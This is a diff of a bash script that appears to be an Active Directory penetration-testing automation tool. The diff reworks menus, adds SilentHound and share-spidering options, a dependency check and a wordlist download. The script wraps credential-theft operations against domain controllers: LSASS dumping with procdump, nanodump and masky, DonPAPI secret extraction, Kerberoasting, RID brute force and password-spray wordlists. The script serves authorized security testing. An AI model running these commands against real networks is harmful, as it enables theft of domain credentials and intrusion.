 procdump_dump_dc () {
+    echo -e "${BLUE}[*] Dumping LSASS from DC using procdump${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping LSASS from DC using procdump${NC}"
         ${crackmapexec} smb ${target_dc} ${argument_cme} -M procdump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
 
 procdump_dump () {
+    echo -e "${BLUE}[*] Dumping LSASS using procdump${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping LSASS using procdump${NC}"
         if [ "${kerb_bool}" == true ]; then
             echo -e "${PURPLE}[-] Targeting DC only${NC}"
             procdump_dump_dc
@@ -1052,20 +1103,20 @@ procdump_dump () {
 }
 
 nanodump_dump_dc () {
+    echo -e "${BLUE}[*] Dumping LSASS from DC using nanodump${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping LSASS from DC using nanodump${NC}"
         ${crackmapexec} smb ${target_dc} ${argument_cme} -M nanodump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
 
 nanodump_dump () {
+    echo -e "${BLUE}[*] Dumping LSASS using nanodump${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping LSASS using nanodump${NC}"
         if [ "${kerb_bool}" == true ]; then
             echo -e "${PURPLE}[-] Targeting DC only${NC}"
             nanodump_dump_dc
@@ -1084,10 +1135,10 @@ donpapi_dump_dc () {
     if [ ! -f "${donpapi_dir}/DonPAPI.py" ] ; then
         echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
     else
+        echo -e "${BLUE}[*] Dumping secrets from DC using DonPAPI${NC}"
         if [ "${nullsess_bool}" == true ] ; then
             echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
         else
-            echo -e "${BLUE}[*] Dumping secrets from DC using DonPAPI${NC}"
             current_dir=$(pwd)
             cd ${output_dir}/Credentials
             ${python} ${donpapi_dir}/DonPAPI.py ${argument_donpapi}@${dc_ip} -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${dc_ip}.txt
@@ -1101,10 +1152,10 @@ donpapi_dump () {
     if [ ! -f "${donpapi_dir}/DonPAPI.py" ] ; then
         echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
     else
+        echo -e "${BLUE}[*] Dumping secrets using DonPAPI${NC}"
         if [ "${nullsess_bool}" == true ] ; then
             echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
         else
-            echo -e "${BLUE}[*] Dumping secrets using DonPAPI${NC}"
             smb_scan
             current_dir=$(pwd)
             cd ${output_dir}/Credentials
@@ -1119,10 +1170,10 @@ donpapi_dump () {
 }
 
 masky_dump_dc () {
+    echo -e "${BLUE}[*] Dumping LSASS from DC using masky (ADCS required)${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping LSASS from DC using masky (ADCS required)${NC}"
         if [ ! -f "${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt" ]; then
             adcs_enum
         fi
@@ -1138,10 +1189,10 @@ masky_dump_dc () {
 }
 
 masky_dump () {
+    echo -e "${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        echo -e "${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}"
         if [ ! -f "${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt" ]; then
             adcs_enum
         fi
@@ -1167,19 +1218,23 @@ masky_dump () {
 }
 
 mssql_enum () {
-    if [ ! -f "${scripts_dir}/windapsearch" ] || [ ! -f "${impacket_dir}/GetUserSPNs.py" ]; then
+    if [ ! -f "${scripts_dir}/windapsearch" ] || [ ! -f "${impacket_GetUserSPNs}" ]; then
         echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
     else
         echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
         if [ "${kerb_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
             ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m custom --filter "(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))" --attrs dNSHostName | grep dNSHostName | cut -d " " -f 2 | sort -u  >> ${sql_hostname_list}
         elif [ "${nullsess_bool}" == false ]; then
-            ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}
+            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}
             for i in $(/bin/cat ${sql_hostname_list}); do
                 grep -i $(echo $i | cut -d "." -f 1) ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u >> ${sql_ip_list}
             done
         fi
-        ${crackmapexec} mssql ${target_sql} ${argument_cme} -M mssql_priv 2>/dev/null | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
+        if [ ! -f "${sql_ip_list}" ] ; then
+             echo -e "${PURPLE}[-] No SQL servers servers found${NC}"
+        else
+            ${crackmapexec} mssql ${target_sql} ${argument_cme} -M mssql_priv 2>/dev/null | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
+        fi
     fi
     echo -e ""
 }
@@ -1339,6 +1394,7 @@ runasppl_check () {
 ad_enum () {
     bhd_enum
     ldapdomain_enum
+    silenthound_enum
     windapsearch_enum
     enum4linux_enum
     ridbrute_attack
@@ -1370,6 +1426,7 @@ kerberos () {
 scan_shares () {
     smb_map
     shares_cme
+    spider_cme
     keepass_scan
 }
 
@@ -1402,15 +1459,15 @@ vuln_checks () {
 }
 
 print_info() {
-    echo -e "${GREEN}[+] $(date)${NC}"
-    echo -e ""
     echo -e ${auth_string}
     echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain}"
     echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${dc_FQDN}"
     echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${dc_ip}"
     echo -e "${YELLOW}[i]${NC} Running modules: ${modules}"
     echo -e "${YELLOW}[i]${NC} Output folder: $(realpath $output_dir)"
-    echo -e ""
+    echo -e "${YELLOW}[i]${NC} User wordlist file: ${users_list}"
+    echo -e "${YELLOW}[i]${NC} Password wordlist file: ${pass_list}"
+    echo -e "${YELLOW}[i]${NC} Custom servers list: ${servers_list}"
 }
 
 ad_menu () {
@@ -1421,22 +1478,23 @@ ad_menu () {
     echo -e "1) BloodHound Enumeration using all collection methods (Noisy!)"
     echo -e "2) BloodHound Enumeration using DCOnly"
     echo -e "3) ldapdomain Enumeration"
-    echo -e "4) windapsearch Enumeration"
-    echo -e "5) enum4linux-ng Enumeration"
-    echo -e "6) RID Brute Force (Null session)"
-    echo -e "7) Users Enumeration"
-    echo -e "8) crackmapexec User=Pass Check (Noisy!)"
-    echo -e "9) Password Policy Enumeration"
-    echo -e "10) GPP Enumeration"
-    echo -e "11) Password not required Enumeration"
-    echo -e "12) ADCS Enumeration"
-    echo -e "13) Users Description containing word: pass"
-    echo -e "14) Get MachineAccountQuota"
-    echo -e "15) LDAP-signing check"
-    echo -e "16) Trusted-for-delegation check (cme)"
-    echo -e "17) Impacket findDelegation Enumeration"
-    echo -e "18) certi.py Enumeration"
-    echo -e "19) Certipy Enumeration"
+    echo -e "4) SilentHound Enumeration"
+    echo -e "5) windapsearch Enumeration"
+    echo -e "6) enum4linux-ng Enumeration"
+    echo -e "7) RID Brute Force (Null session)"
+    echo -e "8) Users Enumeration"
+    echo -e "9) crackmapexec User=Pass Check (Noisy!)"
+    echo -e "10) Password Policy Enumeration"
+    echo -e "11) GPP Enumeration"
+    echo -e "12) Password not required Enumeration"
+    echo -e "13) ADCS Enumeration"
+    echo -e "14) Users Description containing word: pass"
+    echo -e "15) Get MachineAccountQuota"
+    echo -e "16) LDAP-signing check"
+    echo -e "17) Trusted-for-delegation check (cme)"
+    echo -e "18) Impacket findDelegation Enumeration"
+    echo -e "19) certi.py Enumeration"
+    echo -e "20) Certipy Enumeration"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -1464,21 +1522,22 @@ ad_menu () {
         ;;
 
         4)
-        windapsearch_enum
+        silenthound_enum
         ad_menu
         ;;
 
         5)
-        enum4linux_enum
+        windapsearch_enum
         ad_menu
         ;;
 
         6)
-        ridbrute_attack
-        ad_menu;;
+        enum4linux_enum
+        ad_menu
+        ;;
 
         7)
-        users_enum
+        ridbrute_attack
         ad_menu;;
 
         8)
@@ -1486,46 +1545,50 @@ ad_menu () {
         ad_menu;;
 
         9)
-        passpol_enum
+        users_enum
         ad_menu;;
 
         10)
-        gpp_enum
+        passpol_enum
         ad_menu;;
 
         11)
-        passnotreq_enum
+        gpp_enum
         ad_menu;;
 
         12)
-        adcs_enum
+        passnotreq_enum
         ad_menu;;
 
         13)
-        passdesc_enum
+        adcs_enum
         ad_menu;;
 
         14)
-        macq_enum
+        passdesc_enum
         ad_menu;;
 
         15)
-        ldapsign_enum
+        macq_enum
         ad_menu;;
 
         16)
-        deleg_enum_cme
+        ldapsign_enum
         ad_menu;;
 
         17)
-        deleg_enum_imp
+        deleg_enum_cme
         ad_menu;;
 
         18)
-        certi_py_enum
+        deleg_enum_imp
         ad_menu;;
 
         19)
+        certi_py_enum
+        ad_menu;;
+
+        20)
         certipy_enum
         ad_menu;;
 
@@ -1620,9 +1683,12 @@ shares_menu () {
     echo -e "4) SMB shares Enumeration using cme on target Domain Controller"
     echo -e "5) SMB shares Enumeration using cme on all domain servers"
     echo -e "6) SMB shares Enumeration using cme on custom list of servers"
-    echo -e "7) KeePass Discovery on target Domain Controller"
-    echo -e "8) KeePass Discovery on all domain servers"
-    echo -e "9) KeePass Discovery on custom list of servers"
+    echo -e "7) SMB shares Spidering using cme on target Domain Controller"
+    echo -e "8) SMB shares Spidering using cme on all domain servers"
+    echo -e "9) SMB shares Spidering using cme on custom list of servers"
+    echo -e "10) KeePass Discovery on target Domain Controller"
+    echo -e "11) KeePass Discovery on all domain servers"
+    echo -e "12) KeePass Discovery on custom list of servers"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -1678,18 +1744,42 @@ shares_menu () {
 
         7)
         dns_enum
-        keepass_scan_dc
+        allservers_bool=true
+        spider_cme_dc
         shares_menu
         ;;
 
         8)
+        dns_enum
+        spider_cme
+        shares_menu
+        ;;
+
+        9)
+        dns_enum
+        allservers_bool=false
+        while [ ! -f "${servers_list}" ] ; do
+            echo -e "${RED}Error finding custom servers list.${NC} Please specify file containing list of target servers:"
+            read -p ">> " servers_list </dev/tty
+        done
+        spider_cme
+        shares_menu
+        ;;
+
+        10)
+        dns_enum
+        keepass_scan_dc
+        shares_menu
+        ;;
+
+        11)
         dns_enum
         allservers_bool=true
         keepass_scan
         shares_menu
         ;;
 
-        9)
+        12)
         dns_enum
         allservers_bool=false
         while [ ! -f "${servers_list}" ] ; do
@@ -2169,37 +2259,61 @@ pwd_menu () {
 
 config_menu () {
     echo -e ""
-    echo -e "${YELLOW}[i]${NC} Output folder: $(realpath $output_dir)"
-    echo -e "${YELLOW}[i]${NC} User wordlist file: ${users_list}"
-    echo -e "${YELLOW}[i]${NC} Password wordlist file: ${pass_list}"
-    echo -e "${YELLOW}[i]${NC} Custom servers list: ${servers_list}"
-
-    echo -e ""
     echo -e "${CYAN}[Config menu]${NC} Please choose from the following options:"
-    echo -e "-------------------------------------------------------"
-    echo -e "1) Change output folder"
-    echo -e "2) Synchronize time with Domain Controller (requires root)"
-    echo -e "3) Add Domain Controller's IP and Domain to /etc/hosts (requires root)"
-    echo -e "4) Update resolv.conf to define Domain Controller as DNS server (requires root)"
-    echo -e "5) Change users wordlist file"
-    echo -e "6) Change passwords wordlist file"
-    echo -e "7) Define custom servers list"
-    echo -e "99) Back to Main Menu"
+    echo -e "------------------------------------------------------"
+    echo -e "M) Main Menu"
+    echo -e "1) Check installation of tools and dependencies"
+    echo -e "2) Change output folder"
+    echo -e "3) Synchronize time with Domain Controller (requires root)"
+    echo -e "4) Add Domain Controller's IP and Domain to /etc/hosts (requires root)"
+    echo -e "5) Update resolv.conf to define Domain Controller as DNS server (requires root)"
+    echo -e "6) Download default username and password wordlists (non-kali machines)"
+    echo -e "7) Change users wordlist file"
+    echo -e "8) Change passwords wordlist file"
+    echo -e "9) Define custom servers list"
 
     read -p "> " option_selected </dev/tty
 
     case ${option_selected} in
         1)
-        output_dir_old=$output_dir
-        echo -e "Please specify new output folder:"
-        read -p ">> " output_dir </dev/tty
-        mv $output_dir_old $output_dir
-        echo -e "${GREEN}[+] Output folder updated${NC}"
         echo -e ""
+        if [ ! -f "${python}" ] ; then echo -e "${RED}[-] python is not installed${NC}"; else echo -e "${GREEN}[+] python is installed${NC}"; fi
+        if [ ! -f "${impacket_findDelegation}" ] ; then echo -e "${RED}[-] impacket's findDelegation is not installed${NC}"; else echo -e "${GREEN}[+] impacket's findDelegation is installed${NC}"; fi
+        if [ ! -f "${impacket_GetUserSPNs}" ] ; then echo -e "${RED}[-] impacket's GetUserSPNs is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetUserSPNs is installed${NC}"; fi
+        if [ ! -f "${impacket_secretsdump}" ] ; then echo -e "${RED}[-] impacket's secretsdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's secretsdump is installed${NC}"; fi
+        if [ ! -f "${impacket_GetNPUsers}" ] ; then echo -e "${RED}[-] impacket's GetNPUsers is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetNPUsers is installed${NC}"; fi
+        if [ ! -f "${impacket_getTGT}" ] ; then echo -e "${RED}[-] impacket's getTGT is not installed${NC}"; else echo -e "${GREEN}[+] impacket's getTGT is installed${NC}"; fi
+        if [ ! -f "${bloodhound}" ] ; then echo -e "${RED}[-] bloodhound is not installed${NC}"; else echo -e "${GREEN}[+] bloodhound is installed${NC}"; fi
+        if [ ! -f "${ldapdomaindump}" ] ; then echo -e "${RED}[-] ldapdomaindump is not installed${NC}"; else echo -e "${GREEN}[+] ldapdomaindump is installed${NC}"; fi
+        if [ ! -f "${crackmapexec}" ] ; then echo -e "${RED}[-] crackmapexec is not installed${NC}"; else echo -e "${GREEN}[+] crackmapexec is installed${NC}"; fi
+        if [ ! -f "${john}" ] ; then echo -e "${RED}[-] john is not installed${NC}"; else echo -e "${GREEN}[+] john is installed${NC}"; fi
+        if [ ! -f "${smbmap}" ] ; then echo -e "${RED}[-] smbmap is not installed${NC}"; else echo -e "${GREEN}[+] smbmap is installed${NC}"; fi
+        if [ ! -f "${nmap}" ] ; then echo -e "${RED}[-] nmap is not installed${NC}"; else echo -e "${GREEN}[+] nmap is installed${NC}"; fi
+        if [ ! -f "${adidnsdump}" ] ; then echo -e "${RED}[-] adidnsdump is not installed${NC}"; else echo -e "${GREEN}[+] adidnsdump is installed${NC}"; fi
+        if [ ! -f "${certi_py}" ] ; then echo -e "${RED}[-] certi_py is not installed${NC}"; else echo -e "${GREEN}[+] certi_py is installed${NC}"; fi
+        if [ ! -f "${certipy}" ] ; then echo -e "${RED}[-] certipy is not installed${NC}"; else echo -e "${GREEN}[+] certipy is installed${NC}"; fi
+        if [ ! -f "${scripts_dir}/windapsearch" ] ; then echo -e "${RED}[-] windapsearch is not installed${NC}"; else echo -e "${GREEN}[+] windapsearch is installed${NC}"; fi
+        if [ ! -f "${scripts_dir}/enum4linux-ng.py" ] ; then echo -e "${RED}[-] enum4linux-ng is not installed${NC}"; else echo -e "${GREEN}[+] enum4linux-ng is installed${NC}"; fi
+        if [ ! -f "${scripts_dir}/kerbrute" ] ; then echo -e "${RED}[-] kerbrute is not installed${NC}"; else echo -e "${GREEN}[+] kerbrute is installed${NC}"; fi
+        if [ ! -f "${scripts_dir}/CVE-2022-33679.py" ] ; then echo -e "${RED}[-] CVE-2022-33679 is not installed${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is installed${NC}"; fi
         config_menu
         ;;
 
         2)
+        echo -e ""
+        echo -e "Please specify new output folder:"
+        read -p ">> " output_dir_new </dev/tty
+        if [ ! "${output_dir_new}" == "" ]; then
+            mkdir -p $output_dir_new 2>/dev/null
+            output_dir=$output_dir_new
+            echo -e "${GREEN}[+] Output folder updated${NC}"
+        else
+            echo -e "${RED}[-] Error updating output folder${NC}"
+        fi
+        config_menu
+        ;;
+
+        3)
         echo -e ""
         sudo timedatectl set-ntp 0
         sudo ntpdate ${dc_ip}
@@ -2207,56 +2321,66 @@ config_menu () {
         config_menu
         ;;
 
-        3)
-        echo -e ""
+        4)
         echo -e "" | sudo tee -a /etc/hosts
         echo -e "${dc_ip}\t${dc_domain}" | sudo tee -a /etc/hosts
         echo -e "${GREEN}[+] /etc/hosts update complete${NC}"
-        echo -e ""
-        config_menu
-        ;;
-
-        4)
-        echo -e ""
-        sudo sed -i '/^#/! s/^/#/g' /etc/resolv.conf
-        echo -e "nameserver ${dc_ip}" | sudo tee -a /etc/resolv.conf
-        echo -e "${GREEN}[+] DNS update complete${NC}"
-        echo -e ""
         config_menu
         ;;
 
         5)
-        echo -e "Please specify new users wordlist file:"
-        read -p ">> " users_list </dev/tty
-        echo -e "${GREEN}[+] Users wordlist file updated${NC}"
         echo -e ""
+        echo -e "Content of /etc/resolv.conf before update:"
+        echo -e "------------------------------------------"
+        cat /etc/resolv.conf
+        sudo sed -i '/^#/! s/^/#/g' /etc/resolv.conf
+        echo -e "nameserver ${dc_ip}" | sudo tee -a /etc/resolv.conf
+        echo -e "${GREEN}[+] DNS update complete${NC}"
         config_menu
         ;;
 
         6)
-        echo -e "Please specify new passwords wordlist file:"
-        read -p ">> " pass_list </dev/tty
-        echo -e "${GREEN}[+] Passwords wordlist file updated${NC}"
         echo -e ""
+        wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz" -O "$wordlists_dir/rockyou.txt.tar.gz"
+        gunzip "$wordlists_dir/rockyou.txt.tar.gz"
+        tar xf "$wordlists_dir/rockyou.txt.tar" -C "$wordlists_dir/"
+        chmod 644 "$wordlists_dir/rockyou.txt"
+        rm "$wordlists_dir/rockyou.txt.tar"
+        wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt" -O "$wordlists_dir/cirt-default-usernames.txt"
+        pass_list="$wordlists_dir/rockyou.txt"
+        users_list="$wordlists_dir/xato-net-10-million-usernames.txt"
+        echo -e "${GREEN}[+] Default username and password wordlists downloaded${NC}"
         config_menu
         ;;
 
         7)
-        echo -e "Please specify new custom servers list file:"
-        read -p ">> " servers_list </dev/tty
-        echo -e "${GREEN}[+] Custom servers list updated${NC}"
-        echo -e ""
+        echo -e "Please specify new users wordlist file:"
+        read -p ">> " users_list </dev/tty
+        echo -e "${GREEN}[+] Users wordlist file updated${NC}"
         config_menu
         ;;
 
-        99)
+        8)
+        echo -e "Please specify new passwords wordlist file:"
+        read -p ">> " pass_list </dev/tty
+        echo -e "${GREEN}[+] Passwords wordlist file updated${NC}"
+        config_menu
+        ;;
+
+        9)
+        echo -e "Please specify new custom servers list file:"
+        read -p ">> " servers_list </dev/tty
+        echo -e "${GREEN}[+] Custom servers list updated${NC}"
+        config_menu
+        ;;
+
+        M)
         main_menu
         ;;
 
         *)
         echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
-        echo -e ""
-        main_menu
+        config_menu
         ;;
     esac
 }
@@ -2273,7 +2397,6 @@ main_menu () {
     echo -e "5) Vulnerability Checks Menu"
     echo -e "6) Password Dump Menu"
     echo -e "7) Run MSSQL Enumeration"
-    echo -e "I) Show session information"
     echo -e "99) Quit"
 
     read -p "> " option_selected </dev/tty
@@ -2317,17 +2440,7 @@ main_menu () {
         exit 1
         ;;
 
-        I)
-        print_banner
-        print_info
-        echo -e "${YELLOW}[i]${NC} User wordlist file: ${users_list}"
-        echo -e "${YELLOW}[i]${NC} Password wordlist file: ${pass_list}"
-        echo -e "${YELLOW}[i]${NC} Custom servers list: ${servers_list}"
-        main_menu
-        ;;
-
         *)
-        echo -e ""
         echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
         echo -e ""
         main_menu
@@ -2335,136 +2448,132 @@ main_menu () {
     esac
 }
 
-main () {
-    prepare
-    
-    if [[ "$modules" == *"interactive"* ]]; then
-        modules="interactive" 
-    fi
-
+main () { 
     print_banner
+    prepare
     print_info
-
-    for i in $(echo $modules | sed "s/,/ /g"); do
-        case $i in
-            interactive)
-            main_menu
-            echo -e ""
-            ;;
-
-            ad_enum)
-            dns_enum
-            echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
-            echo -e "${GREEN}------------------------------------------------${NC}"
-            echo -e ""
-            ad_enum
-            echo -e ""
-            ;;
-
-            kerberos)
-            echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
-            echo -e "${GREEN}------------------------------------------${NC}"
-            echo -e ""
-            kerberos
-            echo -e ""
-            ;;
-
-            scan_shares)
-            dns_enum
-            echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
-            echo -e "${GREEN}---------------------------------------${NC}"
-            echo -e ""
-            scan_shares
-            ;;
-
-            pwd_dump)
-            dns_enum
-            echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
-            echo -e "${GREEN}---------------------------------${NC}"
-            echo -e ""
-            pwd_dump
-            ;;
-
-            mssql_enum)
-            dns_enum
-            echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
-            echo -e "${GREEN}-------------------------------------${NC}"
-            echo -e ""
-            mssql_enum
-            echo -e ""
-            ;;
-
-            vuln_checks)
-            dns_enum
-            echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
-            echo -e "${GREEN}----------------------------------------${NC}"
-            echo -e ""
-            vuln_checks
-            echo -e ""
-            ;;
-
-            all)
-            dns_enum
-            echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
-            echo -e "${GREEN}------------------------------------------------${NC}"
-            echo -e ""
-            ad_enum
-            echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
-            echo -e "${GREEN}------------------------------------------${NC}"
-            echo -e ""
-            kerberos
-            echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
-            echo -e "${GREEN}---------------------------------------${NC}"
-            echo -e ""
-            scan_shares
-            echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
-            echo -e "${GREEN}----------------------------------------${NC}"
-            echo -e ""
-            vuln_checks
-            echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
-            echo -e "${GREEN}-------------------------------------${NC}"
-            echo -e ""
-            mssql_enum
-            echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
-            echo -e "${GREEN}---------------------------------${NC}"
-            echo -e ""
-            pwd_dump
-            ;;
-
-            user)
-            dns_enum
-            echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
-            echo -e "${GREEN}------------------------------------------------${NC}"
-            echo -e ""
-            ad_enum
-            echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
-            echo -e "${GREEN}------------------------------------------${NC}"
-            echo -e ""
-            kerberos
-            echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
-            echo -e "${GREEN}---------------------------------------${NC}"
-            echo -e ""
-            scan_shares
-            echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
-            echo -e "${GREEN}----------------------------------------${NC}"
-            echo -e ""
-            vuln_checks
-            echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
-            echo -e "${GREEN}-------------------------------------${NC}"
-            echo -e ""
-            mssql_enum
-            ;;
-
-            *)
-            echo -e "${RED}[-] Unknown module $i... ${NC}"
-            echo -e ""
-            ;;
-        esac
-    done
-
     echo -e ""
-    echo -e "${GREEN}[+] All modules have completed. Output folder is: $(realpath $output_dir)${NC}"
-    echo -e "${GREEN}------------------------------------------------${NC}"
+    if [[ "$modules" == *"interactive"* ]]; then
+        modules="interactive"
+        config_menu
+    else
+        for i in $(echo $modules | sed "s/,/ /g"); do
+            case $i in
+                ad_enum)
+                dns_enum
+                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
+                echo -e "${GREEN}------------------------------------------------${NC}"
+                echo -e ""
+                ad_enum
+                echo -e ""
+                ;;
+
+                kerberos)
+                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
+                echo -e "${GREEN}------------------------------------------${NC}"
+                echo -e ""
+                kerberos
+                echo -e ""
+                ;;
+
+                scan_shares)
+                dns_enum
+                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
+                echo -e "${GREEN}---------------------------------------${NC}"
+                echo -e ""
+                scan_shares
+                ;;
+
+                pwd_dump)
+                dns_enum
+                echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
+                echo -e "${GREEN}---------------------------------${NC}"
+                echo -e ""
+                pwd_dump
+                ;;
+
+                mssql_enum)
+                dns_enum
+                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
+                echo -e "${GREEN}-------------------------------------${NC}"
+                echo -e ""
+                mssql_enum
+                echo -e ""
+                ;;
+
+                vuln_checks)
+                dns_enum
+                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
+                echo -e "${GREEN}----------------------------------------${NC}"
+                echo -e ""
+                vuln_checks
+                echo -e ""
+                ;;
+
+                all)
+                dns_enum
+                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
+                echo -e "${GREEN}------------------------------------------------${NC}"
+                echo -e ""
+                ad_enum
+                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
+                echo -e "${GREEN}------------------------------------------${NC}"
+                echo -e ""
+                kerberos
+                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
+                echo -e "${GREEN}---------------------------------------${NC}"
+                echo -e ""
+                scan_shares
+                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
+                echo -e "${GREEN}----------------------------------------${NC}"
+                echo -e ""
+                vuln_checks
+                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
+                echo -e "${GREEN}-------------------------------------${NC}"
+                echo -e ""
+                mssql_enum
+                echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
+                echo -e "${GREEN}---------------------------------${NC}"
+                echo -e ""
+                pwd_dump
+                ;;
+
+                user)
+                dns_enum
+                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
+                echo -e "${GREEN}------------------------------------------------${NC}"
+                echo -e ""
+                ad_enum
+                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
+                echo -e "${GREEN}------------------------------------------${NC}"
+                echo -e ""
+                kerberos
+                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
+                echo -e "${GREEN}---------------------------------------${NC}"
+                echo -e ""
+                scan_shares
+                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
+                echo -e "${GREEN}----------------------------------------${NC}"
+                echo -e ""
+                vuln_checks
+                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
+                echo -e "${GREEN}-------------------------------------${NC}"
+                echo -e ""
+                mssql_enum
+                ;;
+
+                *)
+                echo -e "${RED}[-] Unknown module $i... ${NC}"
+                echo -e ""
+                ;;
+            esac
+        done
+
+        echo -e ""
+        echo -e "${GREEN}[+] All modules have completed. Output folder is: $(realpath $output_dir)${NC}"
+        echo -e "${GREEN}-------------------------------------------------${NC}"
+
+    fi
 }
 
 main
